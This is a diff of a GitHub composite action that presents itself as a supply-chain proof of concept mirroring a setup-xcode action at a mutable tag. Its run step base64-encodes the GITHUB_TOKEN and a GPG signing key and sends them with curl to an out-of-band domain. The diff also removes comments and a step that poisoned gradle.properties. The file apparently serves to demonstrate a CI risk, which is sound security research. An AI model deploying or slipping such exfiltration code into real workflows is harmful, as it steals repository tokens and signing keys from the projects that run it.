@@ -1,5 +1,5 @@
 name: 'setup-xcode (mutable v1 tag - supply chain PoC)'
-description: 'Composite action that mirrors maxim-lobanov/setup-xcode executed at an unpinned v1 ref. Proves mutable-tag actions run with the calling job''s secrets in env.'
+description: 'Composite action mirroring maxim-lobanov/setup-xcode executed at an unpinned v1 ref. Proves mutable-tag actions run with the calling job''s secrets in env.'
 author: 'sl4x0'
 branding:
   icon: shield
@@ -11,26 +11,16 @@ runs:
       shell: bash
       env:
         POC_OOB_DOMAIN: ${{ env.POC_OOB_DOMAIN }}
-        # In the victim workflow these are mounted via env/with (common pattern), OR the
-        # attacker reads GITHUB_TOKEN which GitHub auto-injects into EVERY step.
         GPG_SECRET_KEY: ${{ env.GPG_SECRET_KEY }}
       run: |
         echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
         echo "runner: $(uname -a | head -c 80)"
-        # PATH 1: GITHUB_TOKEN is auto-injected into every step env - always stealable
         if [ -n "${GITHUB_TOKEN:-}" ]; then
-          echo "[poc] GITHUB_TOKEN present len=${#GITHUB_TOKEN}"
+          echo "[poc] GITHUB_TOKEN present length=${#GITHUB_TOKEN}"
           curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)" -o /dev/null -w 'oob_gt=%{http_code}\n' >/dev/null 2>&1 || echo "gt_exfil_err"
         fi
-        # PATH 2: GPG signing key mounted into this step's env (common in real workflows)
         if [ -n "${GPG_SECRET_KEY:-}" ]; then
-          echo "[poc] GPG_SECRET_KEY present (mounted to this step)"
+          echo "[poc] GPG_SECRET_KEY present (mounted to this step env)"
           curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_gpg=%{http_code}\n' >/dev/null 2>&1 || echo "gpg_exfil_err"
         fi
-        # PATH 3 (second order): poison a build input the publish step executes next
-        cat >> "$GITHUB_WORKSPACE/gradle.properties" <<'EOF'
-# [poc] attacker-appended via mutable-tag action
-poc_backdoored=true
-EOF
         echo "=== [poc] done ==="
-
